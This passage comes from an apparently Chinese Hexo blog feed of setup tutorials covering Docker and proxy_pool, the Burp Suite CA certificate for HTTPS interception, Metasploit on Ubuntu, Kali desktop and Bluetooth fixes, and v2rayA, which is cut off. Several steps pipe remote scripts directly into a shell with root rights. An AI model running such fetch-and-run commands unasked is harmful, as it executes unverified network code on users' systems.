daemon-reload</span><br><span class="line">systemctl start sub</span><br><span class="line">systemctl enable sub</span><br><span class="line">systemctl status sub</span><br></pre></td></tr></table></figure><ul><li><strong>到这里，后端也就搭建完毕了，我们现在可以在浏览器里面访问我们的后端了，访问后端域名出现下图即为后端搭建成功！</strong></li></ul><p><img src="/../images/sub-web%E8%AE%A2%E9%98%85%E8%BD%AC%E6%8D%A2%E9%9D%A2%E6%9D%BF%E7%9A%84%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/image-20240902235122052143.png" alt="点击放大图片"></p>]]></content>
      
      
      <categories>
          
          <category> 搭建安装 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>proxy_pool安装教程（代理池搭建）</title>
      <link href="//archives/1725291935213/"/>
      <url>//archives/1725291935213/</url>
      
        <content type="html"><![CDATA[<h1 id="proxy-pool安装教程（代理池搭建）"><a href="#proxy-pool安装教程（代理池搭建）" class="headerlink" title="proxy_pool安装教程（代理池搭建）"></a>proxy_pool安装教程（代理池搭建）</h1><h2 id="一、安装-docker"><a href="#一、安装-docker" class="headerlink" title="一、安装 docker"></a>一、安装 docker</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 官方一键安装脚本</span><br><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br><span class="line"></span><br><span class="line">#国内 daocloud一键安装命令</span><br><span class="line">curl -sSL https://get.daocloud.io/docker | sh</span><br></pre></td></tr></table></figure><h2 id="二、安装-docker-compose"><a href="#二、安装-docker-compose" class="headerlink" title="二、安装 docker-compose"></a>二、安装 docker-compose</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 这个是官方地址，可能比较慢，推荐使用下面的国内镜像地址</span><br><span class="line">sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.29.1/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line"># 国内镜像地址</span><br><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/1.29.1/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line"># 下载完之后可以看下 /usr/local/bin 这个目录有没有 docker-compose 这个文件</span><br></pre></td></tr></table></figure><h2 id="三、安装-proxy-pool"><a href="#三、安装-proxy-pool" class="headerlink" title="三、安装 proxy_pool"></a>三、安装 proxy_pool</h2><ul><li><strong>项目地址：</strong><a href="https://github.com/jhao104/proxy_pool">https://github.com/jhao104/proxy_pool</a></li></ul><h4 id="1-下载文件"><a href="#1-下载文件" class="headerlink" title="1.下载文件"></a>1.下载文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/jhao104/proxy_pool.git</span><br></pre></td></tr></table></figure><h4 id="2-打开下载的文件夹"><a href="#2-打开下载的文件夹" class="headerlink" title="2.打开下载的文件夹"></a>2.打开下载的文件夹</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd proxy_pool/</span><br></pre></td></tr></table></figure><h4 id="3-运行"><a href="#3-运行" class="headerlink" title="3.运行"></a>3.运行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="/../images/proxy_pool%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B%EF%BC%88%E4%BB%A3%E7%90%86%E6%B1%A0%E6%90%AD%E5%BB%BA%EF%BC%89/image-20240902234455099200.png" alt="点击放大图片"></p><h4 id="4-如果遇到以下报错时"><a href="#4-如果遇到以下报错时" class="headerlink" title="4.如果遇到以下报错时"></a>4.如果遇到以下报错时</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># docker-compose version</span><br><span class="line">-bash: /usr/local/bin/docker-compose: Permission denied</span><br></pre></td></tr></table></figure><ul><li><strong>解决方法</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><h2 id="四、使用"><a href="#四、使用" class="headerlink" title="四、使用"></a>四、使用</h2><ul><li>启动 web 服务后，默认配置下会开启 <a href="http://127.0.0.1:5010/">http://127.0.0.1:5010</a> 的 api 接口服务：</li></ul><table><thead><tr><th><strong>应用程序编程接口</strong></th><th><strong>方法</strong></th><th><strong>描述</strong></th><th><strong>参数</strong></th></tr></thead><tbody><tr><td><strong>&#x2F;</strong></td><td><strong>GET</strong></td><td><strong>api 介绍</strong></td><td><strong>None</strong></td></tr><tr><td><strong>&#x2F;get</strong></td><td><strong>GET</strong></td><td><strong>随机获取一个代理</strong></td><td><strong>可选参数：</strong><code>?type=https</code>过滤支持 https 的代理</td></tr><tr><td><strong>&#x2F;pop</strong></td><td><strong>GET</strong></td><td><strong>获取并删除一个代理</strong></td><td><strong>可选参数：</strong><code>?type=https</code>过滤支持 https 的代理</td></tr><tr><td><strong>&#x2F;all</strong></td><td><strong>GET</strong></td><td><strong>获取所有代理</strong></td><td><strong>可选参数：</strong><code>?type=https</code>过滤支持 https 的代理</td></tr><tr><td><strong>&#x2F;count</strong></td><td><strong>GET</strong></td><td><strong>查看代理数量</strong></td><td><strong>None</strong></td></tr><tr><td><strong>&#x2F;delete</strong></td><td><strong>GET</strong></td><td><strong>删除代理</strong></td><td><code>?proxy=host:ip</code></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 搭建安装 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 归纳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpsuit安装证书</title>
      <link href="/archives/202409022341.html"/>
      <url>/archives/202409022341.html</url>
      
        <content type="html"><![CDATA[<h1 id="burpsuit安装证书"><a href="#burpsuit安装证书" class="headerlink" title="burpsuit安装证书"></a>burpsuit安装证书</h1><h2 id="一、原因"><a href="#一、原因" class="headerlink" title="一、原因"></a>一、原因</h2><ul><li><strong>HTTPS 协议是为了数据传输安全的需要，在 HTTP 原有的基础上，加入了安全</strong><a href="https://so.csdn.net/so/search?q=%E5%A5%97%E6%8E%A5%E5%AD%97&spm=1001.2101.3001.7020">套接字</a>层 SSL 协议，通过 CA 证书来验证服务器的身份，并对通信消息进行加密。基于 HTTPS 协议这些特性，我们在使用 Burp Proxy 代理时，需要增加更多的设置，才能拦截 HTTPS 的消息。</li><li><strong>如果没有安装 CA 证书就拦截 htpps 协议的网址，就会出现下面的情况</strong></li></ul><p><img src="/../images/burpsuit%E5%AE%89%E8%A3%85%E8%AF%81%E4%B9%A6/image-20240902234007862604.png" alt="点击放大图片"></p><h2 id="二、安装方法"><a href="#二、安装方法" class="headerlink" title="二、安装方法"></a>二、安装方法</h2><h4 id="1、先把代理开启与代理插件开启"><a href="#1、先把代理开启与代理插件开启" class="headerlink" title="1、先把代理开启与代理插件开启"></a>1、先把代理开启与代理插件开启</h4><p><img src="/../images/burpsuit%E5%AE%89%E8%A3%85%E8%AF%81%E4%B9%A6/image-20240902234016873528.png" alt="点击放大图片"></p><h4 id="2、访问-http-burp"><a href="#2、访问-http-burp" class="headerlink" title="2、访问 http://burp"></a>2、访问 <a href="http://burp/">http://burp</a></h4><p><img src="/../images/burpsuit%E5%AE%89%E8%A3%85%E8%AF%81%E4%B9%A6/image-20240902234023116435.png" alt="点击放大图片"></p><h4 id="3、下载证书到本地"><a href="#3、下载证书到本地" class="headerlink" title="3、下载证书到本地"></a>3、下载证书到本地</h4><p><img src="/../images/burpsuit%E5%AE%89%E8%A3%85%E8%AF%81%E4%B9%A6/image-20240902234057712521.png" alt="点击放大图片"></p><h4 id="4、在你使用的浏览器中打开设置，找到管理证书"><a href="#4、在你使用的浏览器中打开设置，找到管理证书" class="headerlink" title="4、在你使用的浏览器中打开设置，找到管理证书"></a>4、在你使用的浏览器中打开设置，找到管理证书</h4><p><img src="/../images/burpsuit%E5%AE%89%E8%A3%85%E8%AF%81%E4%B9%A6/image-20240902234028613794.png" alt="点击放大图片"></p><h4 id="5、点击证书颁发机构，然后导入证书"><a href="#5、点击证书颁发机构，然后导入证书" class="headerlink" title="5、点击证书颁发机构，然后导入证书"></a>5、点击证书颁发机构，然后导入证书</h4><p><img src="/../images/burpsuit%E5%AE%89%E8%A3%85%E8%AF%81%E4%B9%A6/image-20240902234302885170.png" alt="点击放大图片"></p><h4 id="6、选择刚才下载的导入"><a href="#6、选择刚才下载的导入" class="headerlink" title="6、选择刚才下载的导入"></a>6、选择刚才下载的导入</h4><p><img src="/../images/burpsuit%E5%AE%89%E8%A3%85%E8%AF%81%E4%B9%A6/image-20240902234034936280.png" alt="点击放大图片"></p><h4 id="7、勾选上这两个"><a href="#7、勾选上这两个" class="headerlink" title="7、勾选上这两个"></a>7、勾选上这两个</h4><p><img src="/../images/burpsuit%E5%AE%89%E8%A3%85%E8%AF%81%E4%B9%A6/image-20240902234038713083.png" alt="点击放大图片"></p><h4 id="8、如果提示安全警告，点击【是】，提示导入完成。"><a href="#8、如果提示安全警告，点击【是】，提示导入完成。" class="headerlink" title="8、如果提示安全警告，点击【是】，提示导入完成。"></a>8、如果提示安全警告，点击【是】，提示导入完成。</h4><h4 id="9、导入后如果未成功，重启浏览器即可。"><a href="#9、导入后如果未成功，重启浏览器即可。" class="headerlink" title="9、导入后如果未成功，重启浏览器即可。"></a>9、导入后如果未成功，重启浏览器即可。</h4><h4 id="10、测试发现成功！"><a href="#10、测试发现成功！" class="headerlink" title="10、测试发现成功！"></a>10、测试发现成功！</h4><p><img src="/../images/burpsuit%E5%AE%89%E8%A3%85%E8%AF%81%E4%B9%A6/image-20240902234045718212.png" alt="点击放大图片"></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali全局菜单安装（Fildem安装）</title>
      <link href="/archives/202409022148.html"/>
      <url>/archives/202409022148.html</url>
      
        <content type="html"><![CDATA[<h1 id="kali全局菜单安装-Fildem安装）"><a href="#kali全局菜单安装-Fildem安装）" class="headerlink" title="kali全局菜单安装(Fildem安装）"></a>kali全局菜单安装(Fildem安装）</h1><h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libbamf3-dev bamfdaemon libkeybinder-3.0-dev git python3-pip</span><br><span class="line">python3 -m pip install --user fuzzysearch</span><br><span class="line">sudo apt install appmenu-gtk-module-common appmenu-gtk2-module appmenu-gtk3-module</span><br><span class="line"></span><br><span class="line">cd /opt</span><br><span class="line">git clone https://github.com/gonzaarcr/Fildem</span><br><span class="line"></span><br><span class="line">cd Fildem</span><br><span class="line"></span><br><span class="line">mv fildemGMenu@gonza.com ~/.local/share/gnome-shell/extensions</span><br><span class="line"></span><br><span class="line">sudo python3 setup.py install --optimize=1</span><br></pre></td></tr></table></figure><h2 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">第一步：</span><br><span class="line">vim ~/.gtkrc-2.0</span><br><span class="line"></span><br><span class="line">#增加</span><br><span class="line">    gtk-modules=&quot;appmenu-gtk-module&quot;</span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line">第二步：</span><br><span class="line">vim ~/.config/gtk-3.0/settings.ini</span><br><span class="line"></span><br><span class="line">#在[Settings]中增加</span><br><span class="line">    gtk-modules=&quot;appmenu-gtk-module&quot;</span><br></pre></td></tr></table></figure><h2 id="三、启用"><a href="#三、启用" class="headerlink" title="三、启用"></a>三、启用</h2><ul><li><strong>在拓展中启用 filedem 且如下设置</strong></li></ul><p><img src="/../images/kali%E5%85%A8%E5%B1%80%E8%8F%9C%E5%8D%95%E5%AE%89%E8%A3%85%EF%BC%88Fildem%E5%AE%89%E8%A3%85%EF%BC%89/image-20240902214728934914-20241101104039242.jpg" alt="img"></p><h2 id="四、添加自启动"><a href="#四、添加自启动" class="headerlink" title="四、添加自启动"></a>四、添加自启动</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gedit ~/.config/autostart/fildem.desktop</span><br><span class="line"></span><br><span class="line">## 添加内容</span><br><span class="line"></span><br><span class="line">[Desktop Entry]</span><br><span class="line">Type=Application</span><br><span class="line">Exec=fildem</span><br><span class="line">Hidden=false</span><br><span class="line">NoDisplay=false</span><br><span class="line">X-GNOME-Autostart-enabled=true</span><br><span class="line">Name[en_US]=Fildem</span><br><span class="line">Name=Fildem</span><br><span class="line">Comment[en_US]=Fildem Global Menu and HUD</span><br><span class="line">Comment=Fildem Global Menu and HUD</span><br></pre></td></tr></table></figure><h2 id="五、重启系统"><a href="#五、重启系统" class="headerlink" title="五、重启系统"></a>五、重启系统</h2>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> 搭建安装 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typecho不用进入后台如何关闭已启用的插件</title>
      <link href="/archives/202409022142.html"/>
      <url>/archives/202409022142.html</url>
      
        <content type="html"><![CDATA[<h2 id="Typecho不用进入后台如何关闭已启用的插件"><a href="#Typecho不用进入后台如何关闭已启用的插件" class="headerlink" title="Typecho不用进入后台如何关闭已启用的插件"></a>Typecho不用进入后台如何关闭已启用的插件</h2><h2 id="一：前言"><a href="#一：前言" class="headerlink" title="一：前言"></a>一：前言</h2><ul><li><strong>前一段时间，我给 typecho 想换个后台主题，于是搜索安装了一个插件，但是在它安装后，起用这个这个插件的时候发现网站后台无法登陆了。</strong></li><li><strong>所以想要解决这个问题，就需要关闭这个插件。</strong></li></ul><h2 id="二：解决方法"><a href="#二：解决方法" class="headerlink" title="二：解决方法"></a>二：解决方法</h2><ul><li><strong>我网上看了半天 typecho 的数据库终于发现了控制 typecho 的插件启用的表。</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typecho_options</span><br></pre></td></tr></table></figure><ul><li>**进入表，修改表中的列 **<strong>plugins</strong> 的值为</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:0:&#123;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/Typecho%E4%B8%8D%E7%94%A8%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0%E5%A6%82%E4%BD%95%E5%85%B3%E9%97%AD%E5%B7%B2%E5%90%AF%E7%94%A8%E7%9A%84%E6%8F%92%E4%BB%B6/image-20240902214212403877-20241101102718119.png" alt="点击放大图片"></p>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu快速安装MSF的命令</title>
      <link href="/archives/202409022138.html"/>
      <url>/archives/202409022138.html</url>
      
        <content type="html"><![CDATA[<h1 id="Ubuntu快速安装MSF的命令"><a href="#Ubuntu快速安装MSF的命令" class="headerlink" title="Ubuntu快速安装MSF的命令"></a>Ubuntu快速安装MSF的命令</h1><h4 id="1、这个官方安装脚本，我们只需要运行一下就行了"><a href="#1、这个官方安装脚本，我们只需要运行一下就行了" class="headerlink" title="1、这个官方安装脚本，我们只需要运行一下就行了"></a>1、这个官方安装脚本，我们只需要运行一下就行了</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \chmod 755 msfinstall &amp;&amp; \./msfinstall</span><br></pre></td></tr></table></figure><h4 id="2、安装完成后，msf-使用的是-postgresql-数据库-如果没有的话需要先安装"><a href="#2、安装完成后，msf-使用的是-postgresql-数据库-如果没有的话需要先安装" class="headerlink" title="2、安装完成后，msf 使用的是 postgresql 数据库 , 如果没有的话需要先安装"></a>2、安装完成后，msf 使用的是 postgresql 数据库 , 如果没有的话需要先安装</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install postgresql</span><br></pre></td></tr></table></figure><h4 id="3、安装完成之后确认下服务是否开启，如果没有开启它"><a href="#3、安装完成之后确认下服务是否开启，如果没有开启它" class="headerlink" title="3、安装完成之后确认下服务是否开启，如果没有开启它"></a>3、安装完成之后确认下服务是否开启，如果没有开启它</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service postgresql status</span><br></pre></td></tr></table></figure><h4 id="4、接着输入-msfconsole-会提示你是否建立一个数据库，你输入-y-就好"><a href="#4、接着输入-msfconsole-会提示你是否建立一个数据库，你输入-y-就好" class="headerlink" title="4、接着输入 msfconsole 会提示你是否建立一个数据库，你输入 y 就好"></a>4、接着输入 <code>msfconsole</code> 会提示你是否建立一个数据库，你输入 y 就好</h4><h4 id="5、测试一下数据库是否可以使用"><a href="#5、测试一下数据库是否可以使用" class="headerlink" title="5、测试一下数据库是否可以使用"></a>5、测试一下数据库是否可以使用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search windows</span><br></pre></td></tr></table></figure><h4 id="6、如果还是不可以的话，可以进入-metasploit-中，输入-y-就好"><a href="#6、如果还是不可以的话，可以进入-metasploit-中，输入-y-就好" class="headerlink" title="6、如果还是不可以的话，可以进入 metasploit 中，输入 y 就好"></a>6、如果还是不可以的话，可以进入 metasploit 中，输入 y 就好</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfdb init</span><br></pre></td></tr></table></figure><h4 id="7、msf-安装好的目录位于"><a href="#7、msf-安装好的目录位于" class="headerlink" title="7、msf 安装好的目录位于"></a>7、msf 安装好的目录位于</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/metasploit-framework</span><br></pre></td></tr></table></figure><h4 id="8、msf-更新命令："><a href="#8、msf-更新命令：" class="headerlink" title="8、msf 更新命令："></a>8、msf 更新命令：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfupdate</span><br></pre></td></tr></table></figure><p><strong>搬砖：</strong><a href="https://www.cnblogs.com/tomyyyyy/p/12813299.html">https://www.cnblogs.com/tomyyyyy/p/12813299.html</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> 搭建安装 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 搬砖 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali连接蓝牙</title>
      <link href="//archives/1725244920854/"/>
      <url>//archives/1725244920854/</url>
      
        <content type="html"><![CDATA[<h1 id="kali-连接蓝牙"><a href="#kali-连接蓝牙" class="headerlink" title="kali 连接蓝牙"></a>kali 连接蓝牙</h1><h2 id="一、启动蓝牙服务"><a href="#一、启动蓝牙服务" class="headerlink" title="一、启动蓝牙服务"></a>一、启动蓝牙服务</h2><ul><li><strong>Kali Linux 默认状态下并没有启动蓝牙服务，如果尝试打开蓝牙管理器会提示 Bluez 守护进程没有运行，不能继续。应用下列指令开启蓝牙服务：</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service bluetooth start</span><br></pre></td></tr></table></figure><h2 id="二、配对设备"><a href="#二、配对设备" class="headerlink" title="二、配对设备"></a>二、配对设备</h2><ul><li><strong>开启蓝牙服务后右上角状态栏出现了蓝牙图标。</strong></li><li><strong>点击蓝牙图标并选择“设置新设备“。</strong></li><li><strong>此时配对目标蓝牙设备，这时不会出现问题。</strong></li></ul><h2 id="三、连接设备"><a href="#三、连接设备" class="headerlink" title="三、连接设备"></a>三、连接设备</h2><ul><li><strong>此时可能会出现“Device successfully added.But failed to connect.”</strong></li><li><strong>这个问题并不是蓝牙协议或者其他原因造成的。</strong></li><li><strong>造成它的原因仅仅是 Blueman-manager 本身。</strong></li></ul><h2 id="四、问题解决"><a href="#四、问题解决" class="headerlink" title="四、问题解决"></a>四、问题解决</h2><ul><li><strong>这时候我们只需要换一种方式连接蓝牙设备就可以了。</strong></li><li><strong>打开 Terminal，输入：</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bluetoothctl</span><br></pre></td></tr></table></figure><ul><li><strong>此时会进入蓝牙管理进程。</strong></li><li><strong>再点击右上角的蓝牙图标，选择“设备”。</strong></li></ul><p><img src="/../images/kali%E8%BF%9E%E6%8E%A5%E8%93%9D%E7%89%99/image-20240902104124699083.png" alt="img"></p><ul><li><strong>右键已经配对的设备，选择“信息”，并复制当前设备的 MAC 地址。</strong></li><li><strong>返回 Terminal，输入：</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">trust MAC 地址（这里粘帖刚刚复制好的 MAC 地址）</span><br><span class="line">connect MAC 地址（这里一样是刚刚复制好的 MAC 地址）</span><br></pre></td></tr></table></figure><p><img src="/../images/kali%E8%BF%9E%E6%8E%A5%E8%93%9D%E7%89%99/image-20240902104130308673.png" alt="img"></p><h2 id="五、收尾"><a href="#五、收尾" class="headerlink" title="五、收尾"></a>五、收尾</h2><ul><li><strong>此时系统并不会把默认设备自动切换到刚刚连接的蓝牙设备。</strong></li><li><strong>以我刚刚连接的蓝牙耳机为例：</strong></li><li><strong>点击音频控制按钮，并在下拉栏中将输出设备替换为蓝牙耳机。</strong></li></ul><p><img src="/../images/kali%E8%BF%9E%E6%8E%A5%E8%93%9D%E7%89%99/image-20240902104133770369.png" alt="img"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://www.cnblogs.com/bobdylan/p/6933784.html">https://www.cnblogs.com/bobdylan/p/6933784.html</a></li><li><a href="https://codeantenna.com/a/TMOMv1BsA3">https://codeantenna.com/a/TMOMv1BsA3</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 归纳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux安装v2ray</title>
      <link href="//archives/1725244431165/"/>
      <url>//archives/1725244431165/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux安装v2ray"><a href="#Linux安装v2ray" class="headerlink" title="Linux安装v2ray"></a>Linux安装v2ray</h1><h2 id="一、下载与安装"><a href="#一、下载与安装" class="headerlink" title="一、下载与安装"></a>一、下载与安装</h2><p><strong>v2rayA 的功能依赖于 V2Ray 内核，因此需要安装内核。</strong></p><h3 id="（一）安装-V2Ray-内核-Xray-内核"><a href="#（一）安装-V2Ray-内核-Xray-内核" class="headerlink" title="（一）安装 V2Ray 内核 &#x2F; Xray 内核"></a>（一）安装 V2Ray 内核 &#x2F; Xray 内核</h3><h4 id="1-V2Ray-Xray-的官方脚本"><a href="#1-V2Ray-Xray-的官方脚本" class="headerlink" title="1.V2Ray &#x2F; Xray 的官方脚本"></a>1.V2Ray &#x2F; Xray 的官方脚本</h4><ul><li><strong>V2Ray 安装参考：</strong><a href="https://github.com/v2fly/fhs-install-v2ray">https://github.com/v2fly/fhs-install-v2ray</a></li><li><strong>Xray 安装参考：</strong><a href="https://github.com/XTLS/Xray-install">https://github.com/XTLS/Xray-install</a></li></ul><h4 id="2-v2rayA-提供的镜像脚本（推荐）"><a href="#2-v2rayA-提供的镜像脚本（推荐）" class="headerlink" title="2.v2rayA 提供的镜像脚本（推荐）"></a>2.v2rayA 提供的镜像脚本（推荐）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sduo curl -Ls https://mirrors.v2raya.org/go.sh | sudo bash</span><br></pre></td></tr></table></figure><ul><li><strong>安装后可以关掉服务，因为 v2rayA 不依赖于该 systemd 服务。</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl disable v2ray --now ### Xray 需要替换服务为 xray</span><br></pre></td></tr></table></figure><h3 id="（二）安装-v2rayA"><a href="#（二）安装-v2rayA" class="headerlink" title="（二）安装 v2rayA"></a>（二）安装 v2rayA</h3><h4 id="1-通过软件源安装"><a href="#1-通过软件源安装" class="headerlink" title="1. 通过软件源安装"></a>1. 通过软件源安装</h4><h5 id="a-添加公钥"><a href="#a-添加公钥" class="headerlink" title="a. 添加公钥"></a>a. 添加公钥</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO - https://apt.v2raya.org/key/public-key.asc | sudo tee /etc/apt/trusted.gpg.d/v2raya.asc</span><br></pre></td></tr></table></figure><h5 id="b-添加-V2RayA-软件源"><a href="#b-添加-V2RayA-软件源" class="headerlink" title="b. 添加 V2RayA 软件源"></a>b. 添加 V2RayA 软件源</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;deb https://apt.v2raya.org/ v2raya main&quot; | sudo tee /etc/apt/sources.list.d/v2raya.list</span><br><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><h5 id="c-安装-V2RayA"><a href="#c-安装-V2RayA" class="headerlink" title="c. 安装 V2RayA"></a>c. 安装 V2RayA</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install v2raya</span><br></pre></td></tr></table></figure><h4 id="2-手动安装-deb-包"><a href="#2-手动安装-deb-包" class="headerlink" title="2. 手动安装 deb 包"></a>2. 手动安装 deb 包</h4><h5 id="a-下载-deb-包"><a href="#a-下载-deb-包" class="headerlink" title="a. 下载 deb 包"></a>a. 下载 deb 包</h5><p><strong>下载后可以使用 Gdebi、QApt 等图形化工具来安装，也可以使用命令行：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install /path/download/installer_debian_xxx_vxxx.deb ### 自行替换 deb 包所在的实际路径</span><br></pre></td></tr></table></figure><h2 id="二、使用方法"><a href="#二、使用方法" class="headerlink" title="二、使用方法"></a>二、使用方法</h2><h3 id="（一）启动-v2rayA-设置-v2rayA-自动启动"><a href="#（一）启动-v2rayA-设置-v2rayA-自动启动" class="headerlink" title="（一）启动 v2rayA &#x2F; 设置 v2rayA 自动启动"></a>（一）启动 v2rayA &#x2F; 设置 v2rayA 自动启动</h3><ul><li><strong>从 1.5 版开始将不再默认为用户启动 v2rayA 及设置开机自动。</strong></li></ul><h4 id="1-启动-v2rayA"><a href="#1-启动-v2rayA" class="headerlink" title="1. 启动 v2rayA"></a>1. 启动 v2rayA</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start v2raya.service</span><br></pre></td></tr></table></figure><h4 id="2-设置开机自动启动"><a href="#2-设置开机自动启动" class="headerlink" title="2. 设置开机自动启动"></a>2. 设置开机自动启动</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl enable v2raya.service</span><br></pre></td></tr></table></figure><h4 id="3-切换-iptables-为-iptables-nft"><a href="#3-切换-iptables-为-iptables-nft" class="headerlink" title="3. 切换 iptables 为 iptables-nft"></a>3. 切换 iptables 为 iptables-nft</h4><ul><li><strong>对于 Debian11 用户来说，iptables 已被弃用。使用 nftables 作为 iptables 